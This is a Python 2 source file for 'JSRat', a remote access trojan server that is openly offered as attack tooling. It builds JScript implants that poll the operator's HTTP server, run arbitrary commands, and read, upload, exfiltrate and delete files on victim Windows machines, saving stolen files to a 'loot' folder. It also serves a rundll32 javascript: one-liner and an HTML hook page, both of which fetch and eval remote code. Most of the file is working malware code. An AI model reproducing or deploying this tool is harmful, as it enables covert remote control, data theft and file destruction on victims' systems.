#!/usr/bin/env python
#
# JSRat Server
# By: Evi1cg
# From: https://github.com/Ridter/MyJSRat
#
import optparse, os, socket, SocketServer, sys , re
from BaseHTTPServer import BaseHTTPRequestHandler, HTTPServer
# from classes.colors import *
import requests # Used for --find-ip option, otherwise not needed

###
#
# colors.py
#
# Color Code Functions in Python
# Works on Winblows or *nix
#
# By: torBot
#
# Use it like a module & import the available functions, then call as you like:
#    from colors import *
#    status("This is a status message")
#    pad(); print red("This is red text")
#    pad(); print blue("This is blue text\n")
#    caution("Cautionary Message")
#    pad()
#    error("This is an error message\n\n")
#

# import os, sys
from ctypes import Structure, c_short, c_ushort, byref

if os.name == 'nt' or sys.platform.startswith('win'):
  from ctypes import windll, Structure, c_short, c_ushort, byref

# Winblows Constants
################################
SHORT = c_short
WORD = c_ushort

# winbase.h
STD_INPUT_HANDLE  = -10
STD_OUTPUT_HANDLE = -11
STD_ERROR_HANDLE  = -12

# wincon.h structs
class COORD(Structure):
  _fields_ = [ ("X", SHORT), ("Y", SHORT)]

class SMALL_RECT(Structure):
  _fields_ = [("Left", SHORT), ("Top", SHORT),
    ("Right", SHORT), ("Bottom", SHORT)]

class CONSOLE_SCREEN_BUFFER_INFO(Structure):
  _fields_ = [
    ("dwSize", COORD), ("dwCursorPosition", COORD),
    ("wAttributes", WORD), ("srWindow", SMALL_RECT),
    ("dwMaximumWindowSize", COORD)]


# OS Color Definitions & Setup
################################
if os.name == 'nt' or sys.platform.startswith('win'):
  stdout_handle = windll.kernel32.GetStdHandle(STD_OUTPUT_HANDLE)
  SetConsoleTextAttribute = windll.kernel32.SetConsoleTextAttribute
  GetConsoleScreenBufferInfo = windll.kernel32.GetConsoleScreenBufferInfo

  # wincon.h
  DIM  = 0x00   # dim
  RS   = ""     # reset (?)
  HC   = 0x08   # hicolor
  BHC  = 0x80   # background hicolor
  UL   = ""     # underline (no workie on winblows)
  INV  = ""     # inverse background and foreground (no workie on winblows)
  FBLK = 0x0000 # foreground black
  FBLK = 0x0008 # foreground grey
  FRED = 0x0004 # foreground red
  FGRN = 0x0002 # foreground green
  FYEL = 0x0006 # foreground yellow
  FBLU = 0x0001 # foreground blue
  FMAG = 0x0005 # foreground magenta
  FCYN = 0x0003 # foreground cyan
  FWHT = 0x0007 # foreground white (grey)
  BBLK = 0x0000 # background black
  BBLK = 0x0080 # background grey
  BRED = 0x0040 # background red
  BGRN = 0x0020 # background green
  BYEL = 0x0060 # background yellow
  BBLU = 0x0010 # background blue
  BMAG = 0x0050 # background magenta
  BCYN = 0x0030 # background cyan
  BWHT = 0x0070 # background white (grey)
else:
  # ANSI color code escapes, for *nix
  DIM  = ""       # dim (no workie)
  RS="\033[0m"    # reset
  HC="\033[1m"    # hicolor
  UL="\033[4m"    # underline
  INV="\033[7m"   # inverse background and foreground
  FBLK="\033[30m" # foreground black
  FRED="\033[31m" # foreground red
  FGRN="\033[32m" # foreground green
  FYEL="\033[33m" # foreground yellow
  FBLU="\033[34m" # foreground blue
  FMAG="\033[35m" # foreground magenta
  FCYN="\033[36m" # foreground cyan
  FWHT="\033[37m" # foreground white
  BBLK="\033[40m" # background black
  BRED="\033[41m" # background red
  BGRN="\033[42m" # background green
  BYEL="\033[43m" # background yellow
  BBLU="\033[44m" # background blue
  BMAG="\033[45m" # background magenta
  BCYN="\033[46m" # background cyan
  BWHT="\033[47m" # background white

def get_text_attr():
  """
      Returns the character attributes (colors) of the console screen buffer.

      Used for windows only
  """
  if os.name == 'nt' or sys.platform.startswith('win'):
    try:
      csbi = CONSOLE_SCREEN_BUFFER_INFO()
      GetConsoleScreenBufferInfo(stdout_handle, byref(csbi))
      return csbi.wAttributes
    except Exception, e:
      pass
  return None


def set_text_attr(color):
  """
      Sets the character attributes (colors) of the console screen
      buffer. Color is a combination of foreground and background color,
      foreground and background intensity.

      Used for windows only
  """
  if os.name == 'nt' or sys.platform.startswith('win'):
    try:
      SetConsoleTextAttribute(stdout_handle, color)
      return True
    except Exception, e:
      pass
  return False


def windows_default_colors():
  """
      Checks and returns the current windows console color mapping
      Returns the necessary foreground and background code to reset later

      Used for windows only
  """
  if os.name == 'nt' or sys.platform.startswith('win'):
    try:
      default_colors = get_text_attr()
      default_bg = default_colors & 0x0070
      return default_bg
    except Exception, e:
      pass
  return None


def restore_windows_colors(default_gb):
  """
      Set or Restore the console colors to the provided foreground + background codes
      Returns True or False

      Used for windows only
  """
  if os.name == 'nt' or sys.platform.startswith('win'):
    try:
      set_text_attr(default_gb)
      return True
    except Exception, e:
      pass
  return False


# Some Simple Print functions
#############################
def pad(): 
  """ Simple pad to make sub points easier to print """
  sys.stdout.write('   ')

def caution(msg): 
  """ [*] Print a cautionary message to user """
  if os.name == 'nt' or sys.platform.startswith('win'):
    windows_user_default_color_code = windows_default_colors()
    set_text_attr(FYEL | BBLK | HC | BHC)
    sys.stdout.write("[")
    set_text_attr(FWHT | BBLK | HC | BHC)
    sys.stdout.write("*")
    set_text_attr(FYEL | BBLK | HC | BHC)
    sys.stdout.write("] ")
    set_text_attr(FWHT | BBLK | HC | BHC)
    sys.stdout.write(str(msg) + "\n")
    restore_windows_colors(windows_user_default_color_code)
  else:
    print HC + FYEL + "[" + FWHT + "-" + FYEL + "] " + FWHT + str( msg ) + RS


def good( msg ): 
  """ [*] Print a success message to user """
  if os.name == 'nt' or sys.platform.startswith('win'):
    windows_user_default_color_code = windows_default_colors()
    set_text_attr(FGRN | BBLK | HC | BHC)
    sys.stdout.write("[")
    set_text_attr(FWHT | BBLK | HC | BHC)
    sys.stdout.write("*")
    set_text_attr(FGRN | BBLK | HC | BHC)
    sys.stdout.write("] ")
    set_text_attr(FWHT | BBLK | HC | BHC)
    sys.stdout.write(str(msg) + "\n")
    restore_windows_colors(windows_user_default_color_code)
  else:
    print HC + FGRN + "[" + FWHT + "*" + FGRN + "] " + FWHT + str( msg ) + RS


def bad( msg ): 
  """ [x] Print a warning or bad message to user """
  if os.name == 'nt' or sys.platform.startswith('win'):
    windows_user_default_color_code = windows_default_colors()
    set_text_attr(FRED | BBLK | HC | BHC)
    sys.stdout.write("[")
    set_text_attr(FWHT | BBLK | HC | BHC)
    sys.stdout.write("x")
    set_text_attr(FRED | BBLK | HC | BHC)
    sys.stdout.write("] ")
    set_text_attr(FWHT | BBLK | HC | BHC)
    sys.stdout.write(str(msg) + "\n")
    restore_windows_colors(windows_user_default_color_code)
  else:
    print HC + FRED + "[" + FWHT + "x" + FRED + "] " + FWHT + str( msg ) + RS


def status(msg ): 
  """ [*] Print a status message to user """
  if os.name == 'nt' or sys.platform.startswith('win'):
    windows_user_default_color_code = windows_default_colors()
    set_text_attr(FBLU | BBLK | HC | BHC)
    sys.stdout.write("[")
    set_text_attr(FWHT | BBLK | HC | BHC)
    sys.stdout.write("*")
    set_text_attr(FBLU | BBLK | HC | BHC)
    sys.stdout.write("] ")
    set_text_attr(FWHT | BBLK | HC | BHC)
    sys.stdout.write(str(msg) + "\n")
    restore_windows_colors(windows_user_default_color_code)
  else:
    print HC + FBLU + "[" + FWHT + "*" + FBLU + "] " + FWHT + str( msg ) + RS


def error( msg ): 
  """ [ERROR] Print an ERROR message to user """
  if os.name == 'nt' or sys.platform.startswith('win'):
    windows_user_default_color_code = windows_default_colors()
    set_text_attr(FRED | BBLK | HC | BHC)
    sys.stdout.write("[")
    set_text_attr(FWHT | BBLK | HC | BHC)
    sys.stdout.write("ERROR")
    set_text_attr(FRED | BBLK | HC | BHC)
    sys.stdout.write("] ")
    set_text_attr(FWHT | BBLK | HC | BHC)
    sys.stdout.write(str(msg) + "\n")
    restore_windows_colors(windows_user_default_color_code)
  else:
    print HC + FRED + "[" + FWHT + "ERROR" + FRED + "] " + FWHT + str( msg ) + RS


def underline( msg ): 
  """ Underline message string (no workie on windows) """
  if os.name == 'nt' or sys.platform.startswith('win'):
    return str(msg)
  return UL + str(msg) + RS


# General Colorize Text Wrappers
################################
def blue( msg ): 
  """ Print BLUE Colored String """
  if os.name == 'nt' or sys.platform.startswith('win'):
    windows_user_default_color_code = windows_default_colors()
    set_text_attr(FBLU | BBLK | HC | BHC)
    sys.stdout.write(str(msg))
    restore_windows_colors(windows_user_default_color_code)
  else:
    return HC + FBLU + str(msg) + RS


def cyan( msg ): 
  """ Print CYAN Colored String """
  if os.name == 'nt' or sys.platform.startswith('win'):
    windows_user_default_color_code = windows_default_colors()
    set_text_attr(FCYN | BBLK | HC | BHC)
    sys.stdout.write(str(msg))
    restore_windows_colors(windows_user_default_color_code)
  else:
    return HC + FCYN + str(msg) + RS


def green( msg ): 
  """ Print GREEN Colored String """
  if os.name == 'nt' or sys.platform.startswith('win'):
    windows_user_default_color_code = windows_default_colors()
    set_text_attr(FGRN | BBLK | HC | BHC)
    sys.stdout.write(str(msg))
    restore_windows_colors(windows_user_default_color_code)
  else:
    return HC + FGRN + str(msg) + RS

def magenta(msg): 
  """ Print MAGENTA Colored String """
  if os.name == 'nt' or sys.platform.startswith('win'):
    windows_user_default_color_code = windows_default_colors()
    set_text_attr(FMAG | BBLK | HC | BHC)
    sys.stdout.write(str(msg))
    restore_windows_colors(windows_user_default_color_code)
  else:
    return HC + FMAG + str(msg) + RS


def red( msg ): 
  """ Print RED Colored String """
  if os.name == 'nt' or sys.platform.startswith('win'):
    windows_user_default_color_code = windows_default_colors()
    set_text_attr(FRED | BBLK | HC | BHC)
    sys.stdout.write(str(msg))
    restore_windows_colors(windows_user_default_color_code)
  else:
    return HC + FRED + str(msg) + RS


def white( msg ): 
  """ Print WHITE Colored String """
  if os.name == 'nt' or sys.platform.startswith('win'):
    windows_user_default_color_code = windows_default_colors()
    set_text_attr(FWHT | BBLK | HC | BHC)
    sys.stdout.write(str(msg))
    restore_windows_colors(windows_user_default_color_code)
  else:
    return HC + FWHT + str(msg) + RS


def yellow(msg ): 
  """ Print YELLOW Colored String """
  if os.name == 'nt' or sys.platform.startswith('win'):
    windows_user_default_color_code = windows_default_colors()
    set_text_attr(FYEL | BBLK | HC | BHC)
    sys.stdout.write(str(msg))
    restore_windows_colors(windows_user_default_color_code)
  else:
    return HC + FYEL + str(msg) + RS


###



global command
command = 'ver'
try:
  import readline
except:
  error("No Python Readline")
  pad(); bad("No history support as a result, sorry...")


def banner():
  cls()
  print red("\nJSRat Server")
  print blue("By") + white(": Evi1cg")


def cls():
  if os.name == 'nt' or sys.platform.startswith('win'):
    os.system('cls')
  else:
    os.system('clear')


def internal_ip():
  'Check Internal IP' # Google IP address used...
  try:
    iip = [(s.connect(('8.8.8.8', 80)), s.getsockname()[0], s.close()) for s in [socket.socket(socket.AF_INET, socket.SOCK_DGRAM)]][0][1]
  except:
    error("Problem resolving internal IP!")
    return "Problem resolving internal IP!"
  return iip


def external_ip():
  'Check External IP using ip.chinaz.com'
  url = 'http://ip.chinaz.com/getip.aspx' # Simple External IP Check using dyndns...
  try:
    headers = { 'User-agent' : 'Python External IP Checker' } 
    res = requests.get( url, headers=headers, timeout=30.0 )
    body = res.text
    extip= re.search(r"ip\:'(.*?)'\,addre", body)
  except:
    error("Problem resolving extrernal IP!")
    return "Problem resolving extrernal IP!"
  return extip.group(1)


def jsrat():
  """
      Build & Return the core JS code to operate JSRat on victim
      Essentially serve up additional JS to be evaluated by client based on need
  """
  jsrat_code = """
			while(true) {
				h = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
				h.SetTimeouts(0, 0, 0, 0);
                        	try {
					h.Open("GET","http://"""+bind_ip+":"+str(listener_port)+"""/rat",false);
					h.Send();
					c = h.ResponseText;
                            		if(c=="delete") {
                                		p=new ActiveXObject("WinHttp.WinHttpRequest.5.1");
                                		p.SetTimeouts(0, 0, 0, 0);
					    	p.Open("POST","http://"""+bind_ip+":"+str(listener_port)+"""/rat",false);
					    	p.Send("[Next Input should be the File to Delete]");
                                		g = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
                                		g.SetTimeouts(0, 0, 0, 0);
                                		g.Open("GET","http://"""+bind_ip+":"+str(listener_port)+"""/rat",false);
					    	g.Send();
					    	d = g.ResponseText;
                                		fso1=new ActiveXObject("Scripting.FileSystemObject");
                                		f =fso1.GetFile(d);
                                		f.Delete();
                                		p=new ActiveXObject("WinHttp.WinHttpRequest.5.1");
                                		p.SetTimeouts(0, 0, 0, 0);
					    	p.Open("POST","http://"""+bind_ip+":"+str(listener_port)+"""/rat",false);
					    	p.Send("[Delete Success]\\n");
                                		continue;
                            		} else if(c=="download") {
                                		p=new ActiveXObject("WinHttp.WinHttpRequest.5.1");
                                		p.SetTimeouts(0, 0, 0, 0);
					    	p.Open("POST","http://"""+bind_ip+":"+str(listener_port)+"""/rat",false);
					    	p.Send("[Next Input should be the File to download]");
                                		g = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
                                		g.SetTimeouts(0, 0, 0, 0);
                                		g.Open("GET","http://"""+bind_ip+":"+str(listener_port)+"""/rat",false);
					    	g.Send();
					    	d = g.ResponseText;
                                		fso1=new ActiveXObject("Scripting.FileSystemObject");
                                		f=fso1.OpenTextFile(d,1);
                                		g=f.ReadAll();
                                		f.Close();
                                		p=new ActiveXObject("WinHttp.WinHttpRequest.5.1");
                                		p.SetTimeouts(0, 0, 0, 0);
					    	p.Open("POST","http://"""+bind_ip+":"+str(listener_port)+"""/download",false);
					    	p.Send(g);
                                		continue;
                          		} else if(c=="read") {
                                		p=new ActiveXObject("WinHttp.WinHttpRequest.5.1");
                                		p.SetTimeouts(0, 0, 0, 0);
					    	p.Open("POST","http://"""+bind_ip+":"+str(listener_port)+"""/rat",false);
					    	p.Send("[Next Input should be the File to Read]");
                                		g = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
                                		g.SetTimeouts(0, 0, 0, 0);
                                		g.Open("GET","http://"""+bind_ip+":"+str(listener_port)+"""/rat",false);
					    	g.Send();
					    	d = g.ResponseText;
                                		fso1=new ActiveXObject("Scripting.FileSystemObject");
                                		f=fso1.OpenTextFile(d,1);
                                		g=f.ReadAll();
                                		f.Close();
                                		p=new ActiveXObject("WinHttp.WinHttpRequest.5.1");
                                		p.SetTimeouts(0, 0, 0, 0);
					    	p.Open("POST","http://"""+bind_ip+":"+str(listener_port)+"""/rat",false);
					    	p.Send(g + "\\n");
                                		continue;
                            		} else if(c=="run") {
                                		p=new ActiveXObject("WinHttp.WinHttpRequest.5.1");
                                		p.SetTimeouts(0, 0, 0, 0);
					    	p.Open("POST","http://"""+bind_ip+":"+str(listener_port)+"""/rat",false);
					    	p.Send("[Next Input should be the File to Run]");
                                		g = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
                                		g.SetTimeouts(0, 0, 0, 0);
                                		g.Open("GET","http://"""+bind_ip+":"+str(listener_port)+"""/rat",false);
					    	g.Send();
					    	d = g.ResponseText;
                                		r = new ActiveXObject("WScript.Shell").Run(d,0,true);
                                		p=new ActiveXObject("WinHttp.WinHttpRequest.5.1");
                                		p.SetTimeouts(0, 0, 0, 0);
					    	p.Open("POST","http://"""+bind_ip+":"+str(listener_port)+"""/rat",false);
                                		p.Send("[Run Success]\\n");
                                		continue;      
                            		}else if(c=="upload") {
                                		p=new ActiveXObject("WinHttp.WinHttpRequest.5.1");
                        		 	p.SetTimeouts(0, 0, 0, 0);
					    	p.Open("POST","http://"""+bind_ip+":"+str(listener_port)+"""/rat",false);
					    	p.Send("[Start to Upload]");
                                		g = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
                                		g.SetTimeouts(0, 0, 0, 0);
                                		g.Open("GET","http://"""+bind_ip+":"+str(listener_port)+"""/uploadpath",false);
					    	g.Send();
					    	dpath = g.ResponseText;
                                		g2 = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
                                		g2.SetTimeouts(0, 0, 0, 0);
                                		g2.Open("GET","http://"""+bind_ip+":"+str(listener_port)+"""/uploaddata",false);
					    	g2.Send();
					    	ddata = g2.ResponseText;
                                		fso1=new ActiveXObject("Scripting.FileSystemObject");
                                		f=fso1.CreateTextFile(dpath,true);
                                		f.WriteLine(ddata);
                                		f.Close();
                                		p=new ActiveXObject("WinHttp.WinHttpRequest.5.1");
                                		p.SetTimeouts(0, 0, 0, 0);
					    	p.Open("POST","http://"""+bind_ip+":"+str(listener_port)+"""/rat",false);
					    	p.Send("[Upload Success]\\n");
                                		continue;
                            		} else {
                            			r = new ActiveXObject("WScript.Shell").Exec(c);
				    		var so;
				    		while(!r.StdOut.AtEndOfStream){so=r.StdOut.ReadAll()}
						p=new ActiveXObject("WinHttp.WinHttpRequest.5.1");
				    		p.Open("POST","http://"""+bind_ip+":"+str(listener_port)+"""/rat",false);
			 	       		p.Send(so + "\\n");
                            		}
                        	} catch(e1) {
                            		p=new ActiveXObject("WinHttp.WinHttpRequest.5.1");
                            		p.SetTimeouts(0, 0, 0, 0);
					p.Open("POST","http://"""+bind_ip+":"+str(listener_port)+"""/rat",false);
                            		p.Send("[ERROR - No Output]\\n");
				}
			}
		"""
  return jsrat_code

def jsratCMD():
  """
      Build & Return the core JS code to operate JSRat on victim
      Essentially serve up additional JS to be evaluated by client based on need
  """
  jsrat_codeCMD = """
				h = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
				h.SetTimeouts(0, 0, 0, 0);
                        	try {
							h.Open("GET","http://"""+bind_ip+":"+str(listener_port)+"""/rat",false);
							h.Send();
							c = h.ResponseText;
							r = new ActiveXObject("WScript.Shell").Run(c,0,true);
                        	} catch(e1) {
                            		p=new ActiveXObject("WinHttp.WinHttpRequest.5.1");
                            		p.SetTimeouts(0, 0, 0, 0);
					p.Open("POST","http://"""+bind_ip+":"+str(listener_port)+"""/rat",false);
                            		p.Send("[Some thing wrong !! ]\\n");
				}
		"""
  return jsrat_codeCMD

def print_jsrat_help():
  """
      Displays JSRat options for Server operator to interact w/Client||Victim
  """
  print
  print white(underline("JSRat Usage Options:"))
  print green("      CMD") + white(" => ") + green("Executes Provided Command")
  print green("      run") + white(" => ") + green("Run EXE or Script")
  print green("     read") + white(" => ") + green("Read File")
  print green("   upload") + white(" => ") + green("Upload File")
  print green(" download") + white(" => ") + green("Download File")
  print green("   delete") + white(" => ") + green("Delete File")
  print green("     help") + white(" => ") + green("Help Menu")
  print green("     exit") + white(" => ") + green("Exit Shell")
  print


def get_user_input():
  while True:
    usr_input = raw_input(red("$")+white("(")+blue("JSRat")+white(")")+red(">")+white(" "))
    if usr_input.strip() != "":
      break
    else:
      print
  return usr_input.strip()


class myHandler(BaseHTTPRequestHandler):
  """
      Custom handler so we can control how different web requests are processed
      Crude setup I threw together, but it works so get over it...
  """
  js_load_path = '/connect' # Base URL path to initialize things (value is overridden at server start)
  upload_path = "" # static so we can set/get as needed, since this isnt powershell...
  time_to_stop = False

  def log_message(self, format, *args):
    """ Custom Log Handler to Spit out on to stderr """
    return

  def do_GET(self):
    """
        Handle any GET requests coming into our server
    """
    content_type = "text/plain"
    response_message = jsrat()
    if self.js_load_path == self.path:
      good("Incoming JSRat Client: %s" % str(self.client_address[0]))
      if 'user-agent' in self.headers.keys() and self.headers['user-agent'].strip() != "":
      	good("User-Agent: %s" % self.headers['User-Agent'])
      print_jsrat_help()

    elif "/rat" == self.path:
      # Get input from server operator on what to do next...
      response_message = get_user_input()
      if response_message.strip().lower() == "help":
        print_jsrat_help()
        while True:
          response_message = get_user_input()
          if response_message.strip().lower() != "help":
            break
          else:
            print
      elif response_message.strip().lower() == "exit":
        print; caution("OK, sending kill command to Client...")
        response_message = "cmd /c taskkill /f /im rundll32.exe"
        caution("Hit CTRL+C to kill server....")

    elif "/uploadpath" == self.path:
      lpath = raw_input(red("$")+white("(")+blue("Enter Full Path for Local File to Upload")+white(")")+red(">")+white(" "))
      myHandler.upload_path = lpath
      caution("Setting local upload path to: %s" % myHandler.upload_path)
      destination_path = raw_input(red("$")+white("(")+blue("Enter Remote Path to Write Uploaded Content")+white(")")+red(">")+white(" "))
      response_message = destination_path.strip()

    elif "/uploaddata" == self.path:
      response_message = open(myHandler.upload_path, 'rb+').read()
      myHandler.upload_path = ""

    elif "/hook" == self.path:
      good("Hooking Client: %s" % str(self.client_address[0]))
      content_type = "text/html"
      response_message = jsrat()
      response_message = """<!doctype html public "-//w3c//dtd html 4.0 transitional//en">
<html>
  <head>
   <title> new document </title>
   <meta name="generator" content="editplus">
   <meta name="author" content="">
   <meta name="keywords" content="">
   <meta name="description" content="">
  </head>
  <body>
   <script language="javascript" type="text/javascript">
      h=new ActiveXObject("WinHttp.WinHttpRequest.5.1");
      h.Open("GET","http://"""+bind_ip+":"+str(listener_port)+srv_url+"""",false);
      h.Send();
      B=h.ResponseText;
      eval(B);
    </script>
  </body>
</html>"""

    elif "/wtf" == self.path:
      good("Client Command Query from: %s" % str(self.client_address[0]))
      response_message = """
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();h=new%20ActiveXObject("WinHttp.WinHttpRequest.5.1");h.Open("GET","http://"""+bind_ip+":"+str(listener_port)+srv_url+"""",false);try{h.Send();b=h.ResponseText;eval(b);}catch(e){new%20ActiveXObject("WScript.Shell").Run("cmd /c taskkill /f /im rundll32.exe",0,true);}"""
      print cyan(response_message + "\n")

    # Send the built response back to client
    self.send_response(200)
    self.send_header('Content-type',content_type)
    self.end_headers()
    self.wfile.write(response_message)


  def do_POST(self):
    """
        Handle any POST requests coming into our server
    """
    if "/rat" == self.path:
      content_len = int(self.headers.getheader('content-length', 0))
      post_body = self.rfile.read(content_len)
      print cyan(post_body)
      if post_body == "[No Output]":
        print
      self.send_response(200)
      self.send_header('Content-type','text/plain')
      self.end_headers()

    elif "/download" == self.path:
      content_len = int(self.headers.getheader('content-length', 0))
      post_body = self.rfile.read(content_len)
      fname = raw_input(red("$")+white("(")+blue("Enter Filename to Save in ./loot/")+white(")")+red(">")+white(" "))
      try:
        loot_file = outdir.strip()+fname.strip()
        fh = open(loot_file, 'wb+')
        fh.write(post_body)
        fh.close()
        pad(); good("Successfully Saved To: %s\n" % loot_file.replace(home, "./"))
      except Exception, e:
        error("Problem saving content to:")
        pad(); bad("%s" % loot_file.replace(home, "./"))
        pad(); pad(); bad(str(e))
      self.send_response(200)
      self.send_header('Content-type','text/plain')
      self.end_headers()
    else:
      caution("%s - Snooper detected..." % str(self.client_address[0]))
      pad(); caution("=> %s" % self.path)
      self.send_error(404)

class SendCMDHandler(BaseHTTPRequestHandler):
  """
      Send command handler so we can auto send command to clinets...
  """
  js_load_path = '/connect' # Base URL path to initialize things (value is overridden at server start)
  upload_path = "" # static so we can set/get as needed, since this isnt powershell...
  time_to_stop = False

  def log_message(self, format, *args):
    """ Custom Log Handler to Spit out on to stderr """
    return

  def do_GET(self):
    """
        Handle any GET requests coming into our server
    """
    content_type = "text/plain"
    response_message = jsratCMD()
    if self.js_load_path == self.path:
      good("Incoming JSRat Client: %s" % str(self.client_address[0]))
      if 'user-agent' in self.headers.keys() and self.headers['user-agent'].strip() != "":
      	good("User-Agent: %s" % self.headers['User-Agent'])

    elif "/rat" == self.path:
      #Send command
      response_message = "cmd.exe /c "+command+" && taskkill /f /im rundll32.exe"
      good("OK, Success Send command to Client...")
      caution("Hit CTRL+C to kill server....")

    elif "/hook" == self.path:
      good("Hooking Client: %s" % str(self.client_address[0]))
      content_type = "text/html"
      response_message = jsrat()
      response_message = """<!doctype html public "-//w3c//dtd html 4.0 transitional//en">
<html>
  <head>
   <title> new document </title>
   <meta name="generator" content="editplus">
   <meta name="author" content="">
   <meta name="keywords" content="">
   <meta name="description" content="">
  </head>
  <body>
   <script language="javascript" type="text/javascript">
      h=new ActiveXObject("WinHttp.WinHttpRequest.5.1");
      h.Open("GET","http://"""+bind_ip+":"+str(listener_port)+srv_url+"""",false);
      h.Send();
      B=h.ResponseText;
      eval(B);
    </script>
  </body>
</html>"""

    elif "/wtf" == self.path:
      good("Client Command Query from: %s" % str(self.client_address[0]))
      response_message = """
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();h=new%20ActiveXObject("WinHttp.WinHttpRequest.5.1");h.Open("GET","http://"""+bind_ip+":"+str(listener_port)+srv_url+"""",false);try{h.Send();b=h.ResponseText;eval(b);}catch(e){new%20ActiveXObject("WScript.Shell").Run("cmd /c taskkill /f /im rundll32.exe",0,true);}"""
      print cyan(response_message + "\n")

    # Send the built response back to client
    self.send_response(200)
    self.send_header('Content-type',content_type)
    self.end_headers()
    self.wfile.write(response_message)


  def do_POST(self):
    """
        Handle any POST requests coming into our server
    """
    if "/rat" == self.path:
      content_len = int(self.headers.getheader('content-length', 0))
      post_body = self.rfile.read(content_len)
      print cyan(post_body)
      if post_body == "[No Output]":
        print
      self.send_response(200)
      self.send_header('Content-type','text/plain')
      self.end_headers()


def main():
  """ 
      Establish our base web server and initiate the event loop to drive things

      1 - Overrides custom handler path for URL to initiate things
      2 - Binds socket to ip and port, and then maps to our custom handler
      3 - Starts endless event loop & pass off for myHandler to handle requests
  """
  try:
    print
    global httpd
    if options.cmd in args:
    	SendCMDHandler.js_load_path = srv_url
    	httpd = SocketServer.TCPServer((bind_ip, listener_port),SendCMDHandler)
    else:
    	myHandler.js_load_path = srv_url
    	httpd = SocketServer.TCPServer((bind_ip, listener_port), myHandler)
    status("Web Server Started on Port: %d" % listener_port)
    status("Awaiting Client Connection to: http://%s:%s%s" % (bind_ip, listener_port, srv_url))
    status("Client Command at: http://%s:%s/wtf" % (bind_ip, listener_port))
    status("Browser Hook Set at: http://%s:%s/hook\n" % (bind_ip, listener_port))
    caution("Hit CTRL+C to Stop the Server at any time...\n")
    httpd.serve_forever()
  except socket.error, e:
    error('Try again in 30 seconds or so...')
    pad()  
    bad('Socket Error:\n\t%s\n' % e)
  except KeyboardInterrupt:
    print ''
    error("CTRL+C Interupt Detected!")
    bad("Shutting Down Web Server...\n")
    httpd.shutdown



# Parse Arguments/Options
parser = optparse.OptionParser(banner(), version="%prog v0.01")
parser.add_option("-i", "--ip", dest="ip", default=None, type="string", help="IP to Bind Server to (i.e. 192.168.0.69)")
parser.add_option("-p", "--port", dest="port", default=None, type="int", help="Port to Run Server on")
parser.add_option("-u", "--url", dest="url", default="/connect", type="string", help="URL to Initiate Client Connection (default: /connect)")
parser.add_option("-f", "--find-ip", action="count", default=0, dest="fip", help="Display Current Internal and External IP Addresses")
parser.add_option("-c", "--command", default="whoami", type="string", dest="cmd", help="auto Send command to client (No interaction)")
parser.add_option("-v", action="count", default=0, dest="verbose", help="Enable Verbose Output")
(options, args) = parser.parse_args()

# Make sure we got necessary arguments
args = sys.argv[1:]
if not args:
  print ""
  parser.print_help()
  print
  sys.exit()

if options.fip:
  print red("[Checking IP....]")
  good("Internal IP: %s" % internal_ip())
  good("External IP: %s\n\n" % external_ip())
  sys.exit()

# Establish IP to bind our web server to (i.e. 127.0.0.1||192.168.0.69||10.10.10.10)
if args and options.ip == None:
  print ' '
  error("Missing Argument: --ip IP")
  error("You need to provide the IP to bind server to!\n")
  parser.print_help()
  print
  sys.exit()
else:
  bind_ip = options.ip

# Establish listner port for our web server (privs needed for low ports < 1024)
if args and options.port == None:
  print ' '
  error("Missing Argument: --port PORTNUMBER")
  error("You need to provide the port to listen on!\n")
  parser.print_help()
  print
  sys.exit()
else:
  listener_port = options.port
  if options.cmd not in args:
  	status("Using interactive method! ")

if options.cmd in args:
  command = options.cmd
  status("Using Command Send method! ")
  

# Establish system based file seperator
if os.name == 'nt' or sys.platform.startswith('win'):
  delimiter = "\\"
else:
  delimiter = "/"

srv_url    = options.url     # The URL path to start client initiation on
verbose    = options.verbose # Enable verbose output for debugging purposes
home       = os.path.dirname(os.path.abspath(__file__)) + delimiter # Home dir
outdir     = home + "loot" + delimiter  # Output directory to save content
if not os.path.isfile(outdir) and not os.path.isdir(outdir):
  os.mkdir(outdir)          # Create output directory if it doesn't exist


# Time for the magic show
if __name__ == "__main__":
  try:
    main()

  except KeyboardInterrupt:
    print "\n"
    print red("[") + white("WARNING") + red("]") + white(" CTRL+C, closing session...\n\n")
    sys.exit()

